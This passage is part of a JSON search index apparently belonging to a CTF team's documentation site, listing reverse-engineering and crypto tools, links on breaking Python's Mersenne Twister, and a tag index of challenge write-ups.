commit to <code>main</code>.</li> </ul>"},{"location":"resources/index.html","title":"Resources","text":""},{"location":"resources/index.html#decompiler","title":"Decompiler","text":"<p>So far all our experience is with Ghidra.</p> <p>Other decompilers:</p> <ul> <li>IDA Pro</li> <li>Radare2</li> <li>Binary Ninja</li> </ul>"},{"location":"resources/index.html#debugger","title":"Debugger","text":"<ul> <li>GDB</li> <li>Pwngdb</li> </ul>"},{"location":"resources/index.html#misc","title":"Misc","text":"<ul> <li>pwntools</li> <li>Find md5 collisions:<ul> <li>https://github.com/cr-marcstevens/hashclash</li> <li>Example problem: https://github.com/google/google-ctf/tree/main/2024/quals/misc-pycalc</li> </ul> </li> <li>Z3 (Sat solver)</li> </ul>"},{"location":"resources/index.html#crypto","title":"Crypto","text":"<ul> <li>CyberChef</li> <li>dCode</li> <li>CrackStation</li> </ul>"},{"location":"resources/index.html#learning","title":"Learning","text":"<ul> <li>HackTricks</li> </ul>"},{"location":"resources/mersenne.html","title":"Breaking Mersenne Twister","text":"<p>This category is about breaking/reversing the <code>random</code> library in python, based in Mersenne Twister PRNG.</p>","tags":["crypto","mersenne"]},{"location":"resources/mersenne.html#useful-links","title":"Useful links","text":"<ul> <li>Wikipedia</li> <li>CPython Implementation in C.</li> <li>Github: BreakerPy</li> <li>Blog: Breaking Python Random module</li> <li>Github: Python-randome-module-cracker</li> </ul> <p>Todo</p> <p>Collect more write-ups on this topic</p>","tags":["crypto","mersenne"]},{"location":"main/tags.html","title":"Tags","text":""},{"location":"main/tags.html#android","title":"android","text":"<ul> <li>Crack me</li> </ul>"},{"location":"main/tags.html#crypto","title":"crypto","text":"<ul> <li>Seedy</li> <li>Breaking Mersenne Twister</li> </ul>"},{"location":"main/tags.html#game","title":"game","text":"<ul> <li>Mine the gap</li> </ul>"},{"location":"main/tags.html#mersenne","title":"mersenne","text":"<ul> <li>Seedy</li> <li>Breaking Mersenne Twister</li> </ul>"},{"location":"main/tags.html#misc","title":"misc","text":"<ul> <li>Mine the gap</li> </ul>"},{"location":"main/tags.html#rev","title":"rev","text":"<ul> <li>Write flag where</li> <li>Crack me</li> </ul>"},{"location":"main/tags.html#web","title":"web","text":"<ul> <li>ScreenCrack</li> </ul>"},{"location":"main/tags.html#z3","title":"z3","text":"<ul> <li>Mine the gap</li> <li>Seedy</li> </ul>"}]}